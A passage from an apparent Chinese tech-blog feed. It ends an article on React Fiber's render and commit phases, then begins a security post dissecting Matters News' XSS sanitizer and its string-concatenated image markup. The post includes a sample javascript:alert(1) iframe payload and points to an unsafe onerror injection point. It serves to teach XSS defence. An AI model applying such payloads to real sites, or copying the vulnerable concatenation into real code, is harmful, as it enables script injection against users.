punctuation\">{</span> <br>    <span class=\"token keyword\">let</span> workInProgress <span class=\"token operator\">=</span> current<span class=\"token punctuation\">.</span>alternate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>workInProgress <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        workInProgress <span class=\"token operator\">=</span> <span class=\"token function\">createFiber</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token operator\">...</span><br>    workInProgress<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> current<span class=\"token punctuation\">;</span><br>    current<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> workInProgress<span class=\"token punctuation\">;</span><br>    <span class=\"token operator\">...</span><br>    <span class=\"token keyword\">return</span> workInProgress<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiber.new.js#L254\">source code</a></p>\n<p>React 在第一次 render 時會將各節點紀錄為 Fiber Tree，而在之後檢查時會建立一個 workInProgress tree ，等待 workInProgress tree 完成後就會被當作 current tree，而此稱為<code>雙緩衝技術</code> (double buffering)。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p6.png\" alt=\"\"><br>\n<a href=\"https://www.youtube.com/watch?v=ZCuYPiUIONs&amp;t=1040s\">source video</a></p>\n<h2 id=\"effect-list\"><a class=\"direct-link\" href=\"#effect-list\">#</a> Effect List</h2>\n<p>在上一張圖中，有標記標籤的元件是需要 side effect 進行處理的，為了達到高效的處理，因此需要將原本的樹狀咧表轉換為線性列表，才能夠快速的遍歷，除此之外還會省略沒有 side effect 的節點，流程如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p7.png\" alt=\"\"></p>\n<p>順序的部分是從子到父的方式去執行，在各個階段如果為該層結構<strong>第一個節點</strong>會記錄在 firstEffect，其後則會記錄在 nextEffect 當中，並會在父層級將其合併起來並將自己綁入 lastEffect ，並向上傳遞，遇到沒有 effect 的節點會直接向上傳遞而不進行更動，最後將所有順序傳遞至 Root 層建立出如下圖的 effect list。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p8.png\" alt=\"Re: Effect list\"><br>\n<a href=\"https://youtu.be/ZCuYPiUIONs?t=1373\">source video</a></p>\n<h2 id=\"render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\"><a class=\"direct-link\" href=\"#render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\">#</a> Render 階段的工作循環</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">workLoop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">isYieldy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isYieldy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush work without yielding</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush asynchronous work until the deadline runs out of time.</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">shouldYield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在上面<a href=\"https://github.com/facebook/react/blob/f765f022534958bcf49120bf23bc1aa665e8f651/packages/react-reconciler/src/ReactFiberScheduler.js#L1136\">程式碼</a>中，nextUnitOfWork 存有 workInProgress 樹中的 Fiber nodes。當 React 輪詢 Fiber tree 時，它會使用這個變量來知曉是否有任何其他 Fiber nodes 具有未完成的工作。目前的 Fiber 處理完後，nextUnitOfWork 會指向下一個 Fiber node 或者 null (結束)。</p>\n<p>輪詢 Fiber trees 主要根據以下四個功能：</p>\n<ul>\n<li>performUnitOfWork</li>\n<li>beginWork</li>\n<li>completeUnitOfWork</li>\n<li>completeWork</li>\n</ul>\n<p>執行順序參考如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p9.gif\" alt=\"\"><br>\n<a href=\"https://images.indepth.dev/images/2019/08/tmp2.gif\">source image</a></p>\n<p>由於透過了深度優先搜尋(DFS)，整個流程會優先執行底部 child node 的工作，最後才會到 parent node。</p>\n<h2 id=\"commit-%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#commit-%E9%9A%8E%E6%AE%B5\">#</a> Commit 階段</h2>\n<p>在這個階段，React 會將 render phase 所產生的 workInProgress tree 轉移到 current tree，並執行 render phase 所比對所產生的 Effect list，此步驟將會有更新 Dom 的節點等等的操作，假如有不需更新的項目將不會包含在 Effect list 中，所以不會被 commit (更新)。</p>\n<p>而執行完後的 current tree 將會被放到 finishedWork tree 中。</p>\n<p>而在此階段將會觸發以下操作：</p>\n<ul>\n<li>執行 getSnapshotBeforeUpdate event</li>\n<li>執行 componentWillUnmount event</li>\n<li>執行所有 DOM 操作</li>\n<li>將 finishedWork tree 設置為 current tree</li>\n<li>執行 componentDidMount event</li>\n<li>執行 componentDidUpdate event</li>\n</ul>\n<h3 id=\"dom-%E6%9B%B4%E6%96%B0\"><a class=\"direct-link\" href=\"#dom-%E6%9B%B4%E6%96%B0\">#</a> Dom 更新</h3>\n<p><a href=\"https://github.com/facebook/react/blob/95a313ec0b957f71798a69d8e83408f40e76765b/packages/react-reconciler/src/ReactFiberScheduler.js#L376\">commitAllHostEffects</a> 是React在其中執行DOM更新的函數。該函數定義了 Dom 需要執行的操作類型。</p>\n<h2 id=\"%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\"><a class=\"direct-link\" href=\"#%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\">#</a> 較少在用 class component ，那來談談 function component</h2>\n<p>時至今日，function component 搭配 hooks 幾乎已成了主流，而 function component 在渲染時可以避免多餘的判斷 (<a href=\"https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L1306\">mountIndeterminateComponent</a>)</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p10.png\" alt=\"RE: React hooks\"><br>\n<a href=\"https://medium.com/the-guild/under-the-hood-of-reacts-hooks-system-eb59638c9dba\">under-the-hood-of-reacts-hooks-system</a></p>\n<p>而大家常用的 <a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiberHooks.new.js\">hook</a> 則會形成 hook 鍊，保存在 Fiber 的 memoizedState 中，通過 dispatcher 去更新 fiber 內的 state 及 effect 狀態：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> hook<span class=\"token operator\">:</span> Hook <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  memoizedState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">// hook 的狀態</span><br>  baseState<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 state</span><br>  baseQueue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//起始 queue</span><br>  queue<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//需要更新的update</span><br>  next<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//下一個hook</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre>\n<p>例如 const [state, updateState] = useState(initialState)， memoizedState 就是 initialState。</p>\n<p>每個 hook 都會被放到 queue 當中。當您調用 setState 函數時，React 其實不會立即調用 updater 函式，而是將其保存在隊列中並安排重新渲染。</p>\n<!-- 至於優化常用的 [useMemo](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L370) 則會將元件改為較為[淺層的比對](https://github.com/facebook/react/blob/v16.13.1/packages/react-reconciler/src/ReactFiberBeginWork.js#L456) -->\n<h3 id=\"%E5%8F%83%E8%80%83\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83\">#</a> 參考</h3>\n<p><a href=\"https://segmentfault.com/a/1190000039225217\">https://segmentfault.com/a/1190000039225217</a><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a><br>\n<a href=\"https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react\">https://indepth.dev/posts/1008/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react</a><br>\n<a href=\"https://www.bilibili.com/video/av48384879/\">https://www.bilibili.com/video/av48384879/</a></p>\n<p>延伸閱讀<br>\n<a href=\"https://segmentfault.com/a/1190000017241034?utm_source=sf-related\">https://segmentfault.com/a/1190000017241034?utm_source=sf-related</a></p>\n",
      "date_published": "2021-05-28T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "title": "防止 XSS 可能比想像中困難",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>如果你不知道什麼是 XSS（Cross-site Scripting），簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。既然可以執行，那就有可能可以把使用者的 token 偷走，假造使用者的身份登入，就算偷不走 token，也可以竄改頁面內容，或是把使用者導到釣魚網站等等。</p>\n<p>要防止 XSS，就必須阻止駭客在網站上面執行程式碼，而防禦的方式有很多，例如說可以透過 CSP（Content-Security-Policy）這個 HTTP response header 防止 inline script 的執行或是限制可以載入 script 的 domain，也可以用 <a href=\"https://web.dev/trusted-types/\">Trusted Types</a> 防止一些潛在的攻擊以及指定規則，或是使用一些過濾 XSS 的 library，例如說 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 以及 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a>。</p>\n<p>但是用了這些就能沒事了嗎？是也不是。</p>\n<p>如果使用正確那當然沒有問題，但若是有用可是設定錯誤的話，還是有可能存在 XSS 的漏洞。</p>\n<!-- summary -->\n<p>前陣子我剛從公司內轉到一個做資安的團隊 <a href=\"https://cymetrics.io/zh-tw\">Cymetrics</a>，在對一些網站做研究的時候發現了一個現成的案例，因此這篇就以這個現成的案例來說明怎樣叫做錯誤的設定，而這個設定又會帶來什麼樣的影響。</p>\n<!-- summary -->\n<h2 id=\"%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\">#</a> 錯誤的設定，意料之外的結果</h2>\n<p><a href=\"https://matters.news/\">Matters News</a> 是一個去中心化的寫作社群平台，而且所有的程式碼都有<a href=\"https://github.com/thematters\">開源</a>！</p>\n<p>像是這種部落格平台，我最喜歡看的是他們怎麼處理內容的過濾，秉持著好奇跟研究的心態，可以來看看他們在文章跟評論的部分是怎麼做的。</p>\n<p>Server 過濾的程式碼在這邊：<a href=\"https://github.com/thematters/matters-server/blob/bf49f129eb63acaab707609f6a12fced7aaf0f4c/src/common/utils/xss.ts\">matters-server/src/common/utils/xss.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> xss <span class=\"token keyword\">from</span> <span class=\"token string\">'xss'</span><br><br><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">onIgnoreTagAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> value<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">/**<br>   * Allow attributes of whitelist tags start with \"data-\" or \"class\"<br>   *<br>   * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data-<br>   */</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'data-'</span> <span class=\"token operator\">||</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// escape its value using built-in escapeAttrValue function</span><br>    <span class=\"token keyword\">return</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'=\"'</span> <span class=\"token operator\">+</span> xss<span class=\"token punctuation\">.</span><span class=\"token function\">escapeAttrValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\"'</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">ignoreTagProcessor</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><br>  <span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  html<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  options<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">[</span>key<span class=\"token operator\">:</span> string<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> any <span class=\"token punctuation\">}</span></span><br><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tag <span class=\"token operator\">===</span> <span class=\"token string\">'input'</span> <span class=\"token operator\">||</span> tag <span class=\"token operator\">===</span> <span class=\"token string\">'textarea'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> xssOptions <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  whiteList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>  onIgnoreTagAttr<span class=\"token punctuation\">,</span><br>  onIgnoreTag<span class=\"token operator\">:</span> ignoreTagProcessor<span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">const</span> customXSS <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xss<span class=\"token punctuation\">.</span>FilterXSS</span><span class=\"token punctuation\">(</span>xssOptions<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sanitize</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">string<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> customXSS<span class=\"token punctuation\">.</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span></code></pre>\n<p>這邊比較值得注意的是這一段：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這一段就是允許被使用的 tag 跟屬性，而屬性的內容也會被過濾。例如說雖然允許 iframe 跟 src 屬性，但是 <code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code> 是行不通的，因為這種 <code>javascript:</code> 開頭的 src 會被過濾掉。</p>\n<p>只看 server side 的沒有用，還需要看 client side 那邊是怎麼 render 的。</p>\n<p>對於文章的顯示是這樣的：<a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/views/ArticleDetail/Content/index.tsx\">src/views/ArticleDetail/Content/index.tsx</a>）</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p>Matters 的前端使用的是 React，在 React 裡面所 render 的東西預設都已經 escape 過了，所以基本上不會有 XSS 的洞。但有時候我們不想要它過濾，例如說文章內容，我們可能會需要一些 tag 可以 render 成 HTML，這時候就可以用 <code>dangerouslySetInnerHTML</code>，傳入這個的東西會直接以 innerHTML 的方式 render 出來，不會被過濾。</p>\n<p>所以一般來說都會採用 js-xss + dangerouslySetInnerHTML 這樣的做法，確保 render 的內容儘管是 HTML，但不會被 XSS。</p>\n<p>這邊在傳入 dangerouslySetInnerHTML 之前先過了一個叫做 optimizeEmbed 的函式，可以繼續往下追，看到 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/text.ts#L89\">src/common/utils/text.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">optimizeEmbed</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">content<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> content<br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\&lt;iframe </span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;iframe loading=\"lazy\"'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><br>      <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">(</span><span class=\"token parameter\">match<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> offset</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token comment\">/* html */</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;picture><br>        &lt;source<br>          type=\"image/webp\"<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          type=\"image/webp\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>        /><br>        &lt;img<br>          src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          loading=\"lazy\"<br>        /><br>      &lt;/picture><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這邊採用 RegExp 把 img src 拿出來，然後用字串拼接的方式直接拼成 HTML，再往下看 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/url.ts#L49\">toSizedImageURL</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">toSizedImageURL</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> url<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> ToSizedImageURLProps</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> assetDomain <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation 